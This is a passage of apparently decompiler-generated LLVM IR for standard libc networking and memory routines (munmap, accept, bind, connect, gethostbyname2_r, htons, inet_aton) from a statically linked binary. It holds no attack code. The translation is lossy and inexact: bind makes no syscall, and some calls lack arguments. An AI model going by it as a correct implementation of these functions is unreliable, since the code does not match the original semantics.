  %v0_c304 = phi i32 [ %v0_c304.pre, %dec_label_pc_c2bc ], [ %v0_c2fc, %.thread ]
  store i32 %v3_c260, i32* %r4.global-to-local, align 4
  ret i32 %v0_c304

; uselistorder directives
  uselistorder i32* %stack_var_0, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_c304, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %dec_label_pc_c2bc, { 1, 0 }
}

define i32 @__mremap(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  store i32 %arg2, i32* @r4, align 4
  %v0_c344 = call i32 @__syscall_ret()
  ret i32 %v0_c344
}

define i32 @_dummy.2() local_unnamed_addr {
entry:
  %v1_c358 = load i32, i32* @r0, align 4
  ret i32 %v1_c358
}

define i32 @__munmap(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  store i32 49756, i32* @r3, align 4
  store i32 %arg1, i32* @r4, align 4
  %v1_c374 = call i32 @_dummy.1()
  %v0_c378 = load i32, i32* @r4, align 4
  store i32 %v0_c378, i32* @r0, align 4
  %v0_c384 = call i32 @__syscall_ret()
  ret i32 %v0_c384
}

define i32 @accept(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  store i32 %arg3, i32* @r3, align 4
  store i32 %arg2, i32* @r2, align 4
  %v7_c3c0 = call i32 @__syscall_cp(i32 285, i32 %arg1, i32 %arg2, i32 %arg3, i32 0, i32 0, i32 0)
  store i32 %v7_c3c0, i32* @r0, align 4
  %v0_c3c4 = call i32 @__syscall_ret()
  ret i32 %v0_c3c4

; uselistorder directives
  uselistorder i32 %arg2, { 1, 0 }
}

define i32 @bind(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %v3_c3dc = load i32, i32* @r4, align 4
  store i32 0, i32* @r4, align 4
  %v0_c3f0 = call i32 @__syscall_ret()
  store i32 %v3_c3dc, i32* @r4, align 4
  ret i32 %v0_c3f0
}

define i32 @connect(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  store i32 %arg3, i32* @r3, align 4
  store i32 %arg2, i32* @r2, align 4
  %v7_c42c = call i32 @__syscall_cp(i32 283, i32 %arg1, i32 %arg2, i32 %arg3, i32 0, i32 0, i32 0)
  store i32 %v7_c42c, i32* @r0, align 4
  %v0_c430 = call i32 @__syscall_ret()
  ret i32 %v0_c430

; uselistorder directives
  uselistorder i32 %arg2, { 1, 0 }
}

define i32 @gethostbyname(i32 %arg1) local_unnamed_addr {
entry:
  store i32 2, i32* @r1, align 4
  %v0_c450 = call i32 @gethostbyname2()
  ret i32 %v0_c450
}

define i32 @gethostbyname2() local_unnamed_addr {
entry:
  %stack_var_-44 = alloca i32, align 4
  %v3_c460 = load i32, i32* @r4, align 4
  %v6_c460 = load i32, i32* @r5, align 4
  %v9_c460 = load i32, i32* @r6, align 4
  %v12_c460 = load i32, i32* @r7, align 4
  %v15_c460 = load i32, i32* @r8, align 4
  %v18_c460 = load i32, i32* @sb, align 4
  %v21_c460 = load i32, i32* @sl, align 4
  %v24_c460 = load i32, i32* @fp, align 4
  store i32 ptrtoint (i32* @global_var_23d00.479 to i32), i32* @sb, align 4
  %v0_c46c = load i32, i32* @r0, align 4
  store i32 %v0_c46c, i32* @sl, align 4
  %v0_c470 = load i32, i32* @r1, align 4
  store i32 %v0_c470, i32* @r8, align 4
  %v2_c478 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_c478, i32* @fp, align 4
  br label %dec_label_pc_c47c

dec_label_pc_c47c:                                ; preds = %dec_label_pc_c4bc.dec_label_pc_c47c_crit_edge, %entry
  %v0_c47c = phi i32 [ %v0_c47c.pre, %dec_label_pc_c4bc.dec_label_pc_c47c_crit_edge ], [ 63, %entry ]
  %v2_c47c = mul i32 %v0_c47c, 2
  store i32 %v2_c47c, i32* @r6, align 4
  %v2_c480 = load i32, i32* @global_var_23d00.479, align 4
  %v1_c484 = or i32 %v2_c47c, 1
  store i32 %v1_c484, i32* @r7, align 4
  %v1_c488 = call i32 @free(i32 %v2_c480)
  %v0_c48c = load i32, i32* @r7, align 4
  store i32 %v0_c48c, i32* @r0, align 4
  %v0_c490 = call i32 @malloc()
  %v0_c494 = load i32, i32* @sb, align 4
  store i32 %v0_c494, i32* @r4, align 4
  %v2_c498 = icmp eq i32 %v0_c490, 0
  store i32 %v0_c490, i32* @r5, align 4
  %v2_c4a0 = inttoptr i32 %v0_c494 to i32*
  store i32 %v0_c490, i32* %v2_c4a0, align 4
  %v0_c4a8 = call i32 @__h_errno_location()
  br i1 %v2_c498, label %dec_label_pc_c4a8, label %dec_label_pc_c4bc

dec_label_pc_c4a8:                                ; preds = %dec_label_pc_c47c
  %v0_c4b0 = load i32, i32* @r5, align 4
  store i32 %v0_c4b0, i32* @r2, align 4
  %v2_c4b4 = inttoptr i32 %v0_c4a8 to i32*
  store i32 3, i32* %v2_c4b4, align 4
  %v0_c4f8.pre = load i32, i32* @r2, align 4
  br label %bb18

dec_label_pc_c4bc:                                ; preds = %dec_label_pc_c47c
  %v0_c4c0 = load i32, i32* @r6, align 4
  %v1_c4c0 = add i32 %v0_c4c0, -19
  %v0_c4c8 = load i32, i32* @r5, align 4
  %v0_c4cc = load i32, i32* @sl, align 4
  %v0_c4d0 = load i32, i32* @r8, align 4
  %v1_c4d4 = add i32 %v0_c4c8, 20
  %v7_c4e0 = inttoptr i32 %v0_c4cc to i8*
  %v8_c4e0 = call i32 @gethostbyname2_r(i8* %v7_c4e0, i32 %v0_c4d0, i32 %v0_c4c8, i32 %v1_c4d4, i32 %v1_c4c0, i32 %v2_c478, i32 %v0_c4a8)
  %v7_c4e4 = icmp eq i32 %v8_c4e0, 34
  br i1 %v7_c4e4, label %dec_label_pc_c4bc.dec_label_pc_c47c_crit_edge, label %dec_label_pc_c4ec

dec_label_pc_c4bc.dec_label_pc_c47c_crit_edge:    ; preds = %dec_label_pc_c4bc
  %v0_c47c.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_c47c

dec_label_pc_c4ec:                                ; preds = %dec_label_pc_c4bc
  %v2_c4ec = icmp eq i32 %v8_c4e0, 0
  br i1 %v2_c4ec, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_c4ec
  %v3_c4f0 = load i32, i32* @global_var_23d00.479, align 4
  br label %bb18

.thread:                                          ; preds = %dec_label_pc_c4ec
  br label %bb18

bb18:                                             ; preds = %bb, %dec_label_pc_c4a8, %.thread
  %v0_c4f8 = phi i32 [ %v0_c4f8.pre, %dec_label_pc_c4a8 ], [ %v3_c4f0, %bb ], [ 0, %.thread ]
  store i32 %v3_c460, i32* @r4, align 4
  store i32 %v6_c460, i32* @r5, align 4
  store i32 %v9_c460, i32* @r6, align 4
  store i32 %v12_c460, i32* @r7, align 4
  store i32 %v15_c460, i32* @r8, align 4
  store i32 %v18_c460, i32* @sb, align 4
  store i32 %v21_c460, i32* @sl, align 4
  store i32 %v24_c460, i32* @fp, align 4
  ret i32 %v0_c4f8

; uselistorder directives
  uselistorder i32 %v0_c4a8, { 1, 0 }
  uselistorder i32 %v0_c490, { 1, 0, 2 }
  uselistorder i32 %v2_c47c, { 1, 0 }
  uselistorder label %bb18, { 2, 0, 1 }
}

define i32 @gethostbyname2_r(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_0 = alloca i32, align 4
  store i32 %arg5, i32* %stack_var_0, align 4
  %stack_var_-296 = alloca i32, align 4
  %stack_var_-1640 = alloca i32, align 4
  %v3_c50c = load i32, i32* @r4, align 4
  %v6_c50c = load i32, i32* @r5, align 4
  %v12_c50c = load i32, i32* @r7, align 4
  %v15_c50c = load i32, i32* @r8, align 4
  %v18_c50c = load i32, i32* @sb, align 4
  %v21_c50c = load i32, i32* @sl, align 4
  %v24_c50c = load i32, i32* @fp, align 4
  store i32 %tmp, i32* @sl, align 4
  store i32 %arg2, i32* @r5, align 4
  %v2_c528 = inttoptr i32 %arg6 to i32*
  store i32 0, i32* %v2_c528, align 4
  store i32 %arg3, i32* @r6, align 4
  store i32 %arg4, i32* @r8, align 4
  %v2_c53c = ptrtoint i32* %stack_var_-1640 to i32
  store i32 %v2_c53c, i32* %r0.global-to-local, align 4
  %v2_c540 = ptrtoint i32* %stack_var_-296 to i32
  store i32 %v2_c540, i32* %r1.global-to-local, align 4
  %v0_c544 = load i32, i32* @sl, align 4
  store i32 %v0_c544, i32* %r2.global-to-local, align 4
  %v0_c548 = load i32, i32* @r5, align 4
  store i32 %v0_c548, i32* %r3.global-to-local, align 4
  store i32 %arg7, i32* @r4, align 4
  %v7_c554 = call i32 @__lookup_name(i32* nonnull %stack_var_-1640, i32 %v2_c540, i32 %v0_c544, i32 %v0_c548, i32 2)
  store i32 %v7_c554, i32* %r0.global-to-local, align 4
  store i32 %v7_c554, i32* @sb, align 4
  %v1_c558 = icmp slt i32 %v7_c554, 0
  br i1 %v1_c558, label %dec_label_pc_c560, label %dec_label_pc_c5dc

dec_label_pc_c560:                                ; preds = %entry
  %v1_c560 = add i32 %v7_c554, 11
  store i32 %v1_c560, i32* %r3.global-to-local, align 4
  switch i32 %v7_c554, label %dec_label_pc_c5bc [
    i32 -11, label %dec_label_pc_c5c8
    i32 -10, label %dec_label_pc_c5c8
    i32 -3, label %dec_label_pc_c5ac
    i32 -2, label %dec_label_pc_c5a0
  ]

dec_label_pc_c5a0:                                ; preds = %dec_label_pc_c560
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_c5b4

dec_label_pc_c5ac:                                ; preds = %dec_label_pc_c560
  store i32 11, i32* %r0.global-to-local, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_c5b4

dec_label_pc_c5b4:                                ; preds = %dec_label_pc_c5a0, %dec_label_pc_c5bc, %dec_label_pc_c5ac
  %v0_c5b4 = phi i32 [ 1, %dec_label_pc_c5a0 ], [ 3, %dec_label_pc_c5bc ], [ 2, %dec_label_pc_c5ac ]
  %v1_c5b4 = load i32, i32* @r4, align 4
  %v2_c5b4 = inttoptr i32 %v1_c5b4 to i32*
  store i32 %v0_c5b4, i32* %v2_c5b4, align 4
  %v1_c728.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_c71c

dec_label_pc_c5bc:                                ; preds = %dec_label_pc_c560
  store i32 74, i32* %r0.global-to-local, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_c5b4

dec_label_pc_c5c8:                                ; preds = %dec_label_pc_c560, %dec_label_pc_c560
  store i32 3, i32* %r3.global-to-local, align 4
  %v1_c5cc = load i32, i32* @r4, align 4
  %v2_c5cc = inttoptr i32 %v1_c5cc to i32*
  store i32 3, i32* %v2_c5cc, align 4
  %v0_c5d0 = call i32 @__errno_location()
  store i32 %v0_c5d0, i32* %r0.global-to-local, align 4
  %v1_c5d4 = inttoptr i32 %v0_c5d0 to i32*
  %v2_c5d4 = load i32, i32* %v1_c5d4, align 4
  store i32 %v2_c5d4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_c71c

dec_label_pc_c5dc:                                ; preds = %entry
  %v0_c5dc = load i32, i32* @r5, align 4
  %v7_c5dc = icmp eq i32 %v0_c5dc, 10
  %. = select i1 %v7_c5dc, i32 16, i32 4
  store i32 %., i32* %r4.global-to-local, align 4
  %v0_c5e8 = load i32, i32* @r8, align 4
  %v1_c5e8 = sub i32 0, %v0_c5e8
  store i32 %v1_c5e8, i32* %r3.global-to-local, align 4
  %v1_c5ec = load i32, i32* @r6, align 4
  %v2_c5ec = add i32 %v1_c5ec, 8
  %v3_c5ec = inttoptr i32 %v2_c5ec to i32*
  store i32 %v0_c5dc, i32* %v3_c5ec, align 4
  %v0_c5f0 = load i32, i32* %r4.global-to-local, align 4
  %v1_c5f0 = load i32, i32* @r6, align 4
  %v2_c5f0 = add i32 %v1_c5f0, 12
  %v3_c5f0 = inttoptr i32 %v2_c5f0 to i32*
  store i32 %v0_c5f0, i32* %v3_c5f0, align 4
  %v0_c5f4 = load i32, i32* @sl, align 4
  %v1_c5f4 = inttoptr i32 %v0_c5f4 to i8*
  store i32 %v0_c5f4, i32* %r0.global-to-local, align 4
  %v0_c5f8 = load i32, i32* %r3.global-to-local, align 4
  %v1_c5f8 = urem i32 %v0_c5f8, 4
  store i32 %v1_c5f8, i32* %r7.global-to-local, align 4
  %v3_c5fc = call i32 @strlen(i8* %v1_c5f4)
  store i32 %v2_c540, i32* @fp, align 4
  %tmp29 = bitcast i32* %stack_var_-296 to i8*
  store i32 %v2_c540, i32* %r0.global-to-local, align 4
  %v3_c610 = call i32 @strlen(i8* %tmp29)
  store i32 %v3_c610, i32* %r0.global-to-local, align 4
  %v0_c614 = load i32, i32* %r7.global-to-local, align 4
  %v0_c620 = load i32, i32* %r4.global-to-local, align 4
  %v1_c620 = add i32 %v0_c620, 4
  store i32 %v1_c620, i32* %r4.global-to-local, align 4
  %v0_c624 = load i32, i32* @sb, align 4
  %v1_c624 = add i32 %v0_c624, 1
  store i32 %v1_c624, i32* %r1.global-to-local, align 4
  %v3_c628 = mul i32 %v1_c624, %v1_c620
  %v1_c614 = add i32 %v3_c610, 18
  %v2_c618 = add i32 %v1_c614, %v0_c614
  %v2_c61c = add i32 %v2_c618, %v3_c5fc
  %v4_c628 = add i32 %v2_c61c, %v3_c628
  store i32 %v4_c628, i32* @r2, align 4
  %v3_c62c = load i32, i32* %stack_var_0, align 4
  store i32 %v3_c62c, i32* %r3.global-to-local, align 4
  %tmp31 = icmp ugt i32 %v4_c628, %v3_c62c
  br i1 %tmp31, label %.thread8, label %dec_label_pc_c63c

.thread8:                                         ; preds = %dec_label_pc_c5dc
  store i32 34, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_c71c

dec_label_pc_c63c:                                ; preds = %dec_label_pc_c5dc
  %v0_c63c = load i32, i32* @r8, align 4
  %v2_c63c = add i32 %v0_c63c, %v0_c614
  store i32 %v2_c63c, i32* %r3.global-to-local, align 4
  %v1_c640 = add i32 %v2_c63c, 12
  store i32 %v1_c640, i32* %r2.global-to-local, align 4
  %v4_c644 = mul i32 %v1_c624, 4
  %v5_c644 = add i32 %v1_c640, %v4_c644
  store i32 %v5_c644, i32* @r4, align 4
  %v1_c648 = load i32, i32* @r6, align 4
  %v2_c648 = add i32 %v1_c648, 4
  %v3_c648 = inttoptr i32 %v2_c648 to i32*
  store i32 %v2_c63c, i32* %v3_c648, align 4
  %v0_c64c = load i32, i32* @r4, align 4
  %v1_c64c = load i32, i32* @r8, align 4
  %v2_c64c = load i32, i32* %r7.global-to-local, align 4
  %v3_c64c = add i32 %v2_c64c, %v1_c64c
  %v4_c64c = inttoptr i32 %v3_c64c to i32*
  store i32 %v0_c64c, i32* %v4_c64c, align 4
  store i32 %v2_c540, i32* @r1, align 4
  %v0_c654 = load i32, i32* %r2.global-to-local, align 4
  %v1_c654 = load i32, i32* @r6, align 4
  %v2_c654 = add i32 %v1_c654, 16
  %v3_c654 = inttoptr i32 %v2_c654 to i32*
  store i32 %v0_c654, i32* %v3_c654, align 4
  %v0_c658 = load i32, i32* @r4, align 4
  %v1_c658 = load i32, i32* @r6, align 4
  %v2_c658 = inttoptr i32 %v1_c658 to i32*
  store i32 %v0_c658, i32* %v2_c658, align 4
  %v0_c65c = load i32, i32* @r4, align 4
  store i32 %v0_c65c, i32* %r0.global-to-local, align 4
  %v2_c660 = call i32 @strcpy(i32 %v0_c65c, i32 %v2_c540)
  store i32 %v2_c660, i32* %r0.global-to-local, align 4
  %v0_c664 = load i32, i32* @r6, align 4
  %v1_c664 = inttoptr i32 %v0_c664 to i32*
  %v2_c664 = load i32, i32* %v1_c664, align 4
  %v3_c664 = inttoptr i32 %v2_c664 to i8*
  store i32 %v2_c664, i32* %r0.global-to-local, align 4
  %v3_c668 = call i32 @strlen(i8* %v3_c664)
  store i32 %v3_c668, i32* %r0.global-to-local, align 4
  %v0_c66c = load i32, i32* @r4, align 4
  %v1_c66c = add i32 %v3_c668, 1
  %v2_c670 = add i32 %v1_c66c, %v0_c66c
  store i32 %v2_c670, i32* @r4, align 4
  %v0_c674 = load i32, i32* @sl, align 4
  %v1_c674 = inttoptr i32 %v0_c674 to i8*
  store i32 %v0_c674, i32* %r1.global-to-local, align 4
  %v0_c678 = load i32, i32* @r6, align 4
  %v1_c678 = inttoptr i32 %v0_c678 to i32*
  %v2_c678 = load i32, i32* %v1_c678, align 4
  %v3_c678 = inttoptr i32 %v2_c678 to i8*
  store i32 %v2_c678, i32* %r0.global-to-local, align 4
  %v6_c67c = call i32 @strcmp(i8* %v3_c678, i8* %v1_c674)
  store i32 %v6_c67c, i32* %r0.global-to-local, align 4
  %v0_c680 = load i32, i32* @r6, align 4
  %v1_c680 = add i32 %v0_c680, 4
  %v2_c680 = inttoptr i32 %v1_c680 to i32*
  %v3_c680 = load i32, i32* %v2_c680, align 4
  store i32 %v3_c680, i32* %r3.global-to-local, align 4
  %v2_c684 = icmp eq i32 %v6_c67c, 0
  %v3_c688 = add i32 %v3_c680, 4
  %v4_c688 = inttoptr i32 %v3_c688 to i32*
  br i1 %v2_c684, label %bb30, label %dec_label_pc_c690

bb30:                                             ; preds = %dec_label_pc_c63c
  store i32 0, i32* %v4_c688, align 4
  br label %dec_label_pc_c6b4

dec_label_pc_c690:                                ; preds = %dec_label_pc_c63c
  %v0_c690 = load i32, i32* @r4, align 4
  store i32 %v0_c690, i32* %v4_c688, align 4
  %v0_c694 = load i32, i32* @sl, align 4
  store i32 %v0_c694, i32* @r1, align 4
  %v0_c698 = load i32, i32* @r4, align 4
  store i32 %v0_c698, i32* %r0.global-to-local, align 4
  %v3_c69c = call i32 @strcpy(i32 %v0_c698, i32 %v0_c694)
  store i32 %v3_c69c, i32* %r0.global-to-local, align 4
  %v0_c6a0 = load i32, i32* @r6, align 4
  %v1_c6a0 = add i32 %v0_c6a0, 4
  %v2_c6a0 = inttoptr i32 %v1_c6a0 to i32*
  %v3_c6a0 = load i32, i32* %v2_c6a0, align 4
  store i32 %v3_c6a0, i32* %r3.global-to-local, align 4
  %v1_c6a4 = add i32 %v3_c6a0, 4
  %v2_c6a4 = inttoptr i32 %v1_c6a4 to i32*
  %v3_c6a4 = load i32, i32* %v2_c6a4, align 4
  %v4_c6a4 = inttoptr i32 %v3_c6a4 to i8*
  store i32 %v3_c6a4, i32* %r0.global-to-local, align 4
  %v3_c6a8 = call i32 @strlen(i8* %v4_c6a4)
  store i32 %v3_c6a8, i32* %r0.global-to-local, align 4
  %v0_c6ac = load i32, i32* @r4, align 4
  %v1_c6ac = add i32 %v0_c6ac, 1
  store i32 %v1_c6ac, i32* %r3.global-to-local, align 4
  %v2_c6b0 = add i32 %v1_c6ac, %v3_c6a8
  store i32 %v2_c6b0, i32* @r4, align 4
  br label %dec_label_pc_c6b4

dec_label_pc_c6b4:                                ; preds = %bb30, %dec_label_pc_c690
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_c6b8 = load i32, i32* @r6, align 4
  %v1_c6b8 = add i32 %v0_c6b8, 4
  %v2_c6b8 = inttoptr i32 %v1_c6b8 to i32*
  %v3_c6b8 = load i32, i32* %v2_c6b8, align 4
  store i32 %v3_c6b8, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  store i32 %v2_c53c, i32* @r8, align 4
  store i32 28, i32* @r7, align 4
  %v2_c6c8 = add i32 %v3_c6b8, 8
  %v3_c6c8 = inttoptr i32 %v2_c6c8 to i32*
  store i32 0, i32* %v3_c6c8, align 4
  %v0_c6f8.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_c6f8

dec_label_pc_c6d0:                                ; preds = %dec_label_pc_c6f8
  %v1_c6d0 = load i32, i32* @r7, align 4
  %v2_c6d0 = mul i32 %v1_c6d0, %v0_c6d0
  store i32 %v2_c6d0, i32* %r1.global-to-local, align 4
  %v1_c6d4 = add i32 %v0_c700, 12
  %v2_c6d4 = inttoptr i32 %v1_c6d4 to i32*
  %v3_c6d4 = load i32, i32* %v2_c6d4, align 4
  store i32 %v3_c6d4, i32* @r3, align 4
  %v1_c6d8 = add i32 %v2_c6d0, 8
  store i32 %v1_c6d8, i32* %r1.global-to-local, align 4
  %v0_c6dc = load i32, i32* @r4, align 4
  %v3_c6dc = add i32 %v3_c700, %v3_c6fc
  %v4_c6dc = inttoptr i32 %v3_c6dc to i32*
  store i32 %v0_c6dc, i32* %v4_c6dc, align 4
  %v0_c6e0 = load i32, i32* @r8, align 4
  %v1_c6e0 = load i32, i32* %r1.global-to-local, align 4
  %v2_c6e0 = add i32 %v1_c6e0, %v0_c6e0
  store i32 %v2_c6e0, i32* %r1.global-to-local, align 4
  %v0_c6e4 = load i32, i32* @r4, align 4
  store i32 %v0_c6e4, i32* %r0.global-to-local, align 4
  %v0_c6e8 = load i32, i32* @r3, align 4
  store i32 %v0_c6e8, i32* %r2.global-to-local, align 4
  %v2_c6ec = add i32 %v0_c6e8, %v0_c6e4
  store i32 %v2_c6ec, i32* @r4, align 4
  %v3_c6f0 = inttoptr i32 %v0_c6e4 to i16*
  %v4_c6f0 = call i32 @memcpy(i16* %v3_c6f0, i32 %v2_c6e0, i32 %v0_c6e8)
  store i32 %v4_c6f0, i32* %r0.global-to-local, align 4
  %v0_c6f4 = load i32, i32* @r5, align 4
  %v1_c6f4 = add i32 %v0_c6f4, 1
  store i32 %v1_c6f4, i32* @r5, align 4
  br label %dec_label_pc_c6f8

dec_label_pc_c6f8:                                ; preds = %dec_label_pc_c6b4, %dec_label_pc_c6d0
  %v0_c6d0 = phi i32 [ %v0_c6f8.pre, %dec_label_pc_c6b4 ], [ %v1_c6f4, %dec_label_pc_c6d0 ]
  %v1_c6f8 = load i32, i32* @sb, align 4
  %v3_c6fc = mul i32 %v0_c6d0, 4
  store i32 %v3_c6fc, i32* %r0.global-to-local, align 4
  %v0_c700 = load i32, i32* @r6, align 4
  %v1_c700 = add i32 %v0_c700, 16
  %v2_c700 = inttoptr i32 %v1_c700 to i32*
  %v3_c700 = load i32, i32* %v2_c700, align 4
  store i32 %v3_c700, i32* %r2.global-to-local, align 4
  %v5_c704 = icmp slt i32 %v0_c6d0, %v1_c6f8
  br i1 %v5_c704, label %dec_label_pc_c6d0, label %dec_label_pc_c708

dec_label_pc_c708:                                ; preds = %dec_label_pc_c6f8
  store i32 0, i32* %r3.global-to-local, align 4
  %v5_c70c = mul i32 %v0_c6d0, 4
  %v6_c70c = add i32 %v3_c700, %v5_c70c
  %v7_c70c = inttoptr i32 %v6_c70c to i32*
  store i32 0, i32* %v7_c70c, align 4
  store i32 %arg6, i32* @r2, align 4
  %v0_c714 = load i32, i32* @r6, align 4
  store i32 %v0_c714, i32* %v2_c528, align 4
  %v0_c718 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_c718, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_c71c

dec_label_pc_c71c:                                ; preds = %.thread8, %dec_label_pc_c5c8, %dec_label_pc_c5b4, %dec_label_pc_c708
  %v1_c728 = phi i32 [ %v2_c5d4, %dec_label_pc_c5c8 ], [ %v1_c728.pre, %dec_label_pc_c5b4 ], [ %v0_c718, %dec_label_pc_c708 ], [ 34, %.thread8 ]
  store i32 %v3_c50c, i32* @r4, align 4
  store i32 %v6_c50c, i32* @r5, align 4
  store i32 %v12_c50c, i32* @r7, align 4
  store i32 %v15_c50c, i32* @r8, align 4
  store i32 %v18_c50c, i32* @sb, align 4
  store i32 %v21_c50c, i32* @sl, align 4
  store i32 %v24_c50c, i32* @fp, align 4
  ret i32 %v1_c728

; uselistorder directives
  uselistorder i32 %v3_c700, { 0, 2, 1 }
  uselistorder i32 %v0_c700, { 1, 0 }
  uselistorder i32 %v0_c6d0, { 1, 3, 0, 2 }
  uselistorder i32 %v0_c6e8, { 1, 0, 2 }
  uselistorder i32 %v0_c6e4, { 1, 0, 2 }
  uselistorder i32 %v3_c6a4, { 1, 0 }
  uselistorder i32 %v2_c678, { 1, 0 }
  uselistorder i32 %v0_c674, { 1, 0 }
  uselistorder i32 %v2_c664, { 1, 0 }
  uselistorder i32 %v1_c624, { 1, 0, 2 }
  uselistorder i32 %v0_c5f4, { 1, 0 }
  uselistorder i32 %v7_c554, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v2_c540, { 1, 2, 3, 4, 0, 5 }
  uselistorder i32* %stack_var_0, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 1, 14, 2, 3, 15, 16, 0 }
  uselistorder i32* %r2.global-to-local, { 2, 1, 3, 4, 5, 6, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 0 }
  uselistorder i32* %r0.global-to-local, { 5, 7, 8, 6, 10, 9, 12, 11, 14, 13, 16, 15, 19, 17, 18, 21, 20, 22, 1, 4, 24, 23, 2, 3, 26, 25, 0 }
  uselistorder i32 %arg6, { 1, 0 }
  uselistorder label %dec_label_pc_c71c, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_c6f8, { 1, 0 }
  uselistorder label %dec_label_pc_c6b4, { 1, 0 }
  uselistorder label %dec_label_pc_c5b4, { 1, 2, 0 }
}

define i32 @__h_errno_location() local_unnamed_addr {
entry:
  ret i32 ptrtoint (i32* @global_var_23ec0.482 to i32)
}

define i32 @htons(i32 %arg1) local_unnamed_addr {
entry:
  %v3_c738 = udiv i32 %arg1, 256
  %v4_c73c = mul i32 %arg1, 256
  %v5_c73c = or i32 %v4_c73c, %v3_c738
  %v3_c744 = urem i32 %v5_c73c, 65536
  ret i32 %v3_c744
}

define i32 @inet_addr(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %v2_c754 = ptrtoint i32* %stack_var_-12 to i32
  %v0_c758 = load i32, i32* @r0, align 4
  %v2_c758 = inttoptr i32 %v0_c758 to i8*
  %v3_c758 = call i32 @__inet_aton(i8* %v2_c758, i32 %v2_c754)
  %v2_c75c = icmp eq i32 %v3_c758, 0
  %v4_c760 = load i32, i32* %stack_var_-12, align 4
  %storemerge = select i1 %v2_c75c, i32 -1, i32 %v4_c760
  ret i32 %storemerge
}

define i32 @__inet_aton(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %stack_var_-28 = alloca i8*, align 4
  %stack_var_-44 = alloca i32, align 4
  %v3_c774 = load i32, i32* @r4, align 4
  %v6_c774 = load i32, i32* @r5, align 4
  %v9_c774 = load i32, i32* @r6, align 4
  %v12_c774 = load i32, i32* @r7, align 4
  %v15_c774 = load i32, i32* @r8, align 4
  %v2_c77c = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_c77c, i32* @r4, align 4
  store i32 %tmp, i32* @r5, align 4
  store i32 %arg2, i32* @r8, align 4
  store i32 %v2_c77c, i32* @r0, align 4
  store i32 0, i32* @r1, align 4
  store i32 16, i32* @r2, align 4
  %v0_c794 = call i32 @memset()
  store i32 %v2_c77c, i32* @r7, align 4
  %v2_c79c = ptrtoint i8** %stack_var_-28 to i32
  store i32 %v2_c79c, i32* @r6, align 4
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_c7a4

dec_label_pc_c7a4:                                ; preds = %dec_label_pc_c80c, %entry
  store i32 %v2_c79c, i32* @r1, align 4
  %v0_c7a8 = load i32, i32* @r5, align 4
  store i32 %v0_c7a8, i32* @r0, align 4
  store i32 0, i32* @r2, align 4
  %v4_c7b0 = call i32 @strtoul(i32 %v0_c7a8, i32 %v2_c79c, i32 0)
  %v3_c7b4 = load i8*, i8** %stack_var_-28, align 4
  %v4_c7b4 = ptrtoint i8* %v3_c7b4 to i32
  store i32 %v4_c7b4, i32* %r1.global-to-local, align 4
  %v1_c7b8 = load i32, i32* @r5, align 4
  %v9_c7b8 = icmp eq i32 %v4_c7b4, %v1_c7b8
  br i1 %v9_c7b8, label %dec_label_pc_c888, label %dec_label_pc_c7c0

dec_label_pc_c7c0:                                ; preds = %dec_label_pc_c7a4
  %v2_c7c0 = load i8, i8* %v3_c7b4, align 1
  %v3_c7c0 = zext i8 %v2_c7c0 to i32
  store i32 %v3_c7c0, i32* @r2, align 4
  %v2_c7c4 = icmp eq i8 %v2_c7c0, 0
  br i1 %v2_c7c4, label %dec_label_pc_c7d0, label %bb

bb:                                               ; preds = %dec_label_pc_c7c0
  %v8_c7c8 = icmp eq i8 %v2_c7c0, 46
  br i1 %v8_c7c8, label %dec_label_pc_c7d0, label %dec_label_pc_c888

dec_label_pc_c7d0:                                ; preds = %dec_label_pc_c7c0, %bb
  %v1_c7d0 = inttoptr i32 %v1_c7b8 to i8*
  %v2_c7d0 = load i8, i8* %v1_c7d0, align 1
  %v3_c7d0 = zext i8 %v2_c7d0 to i32
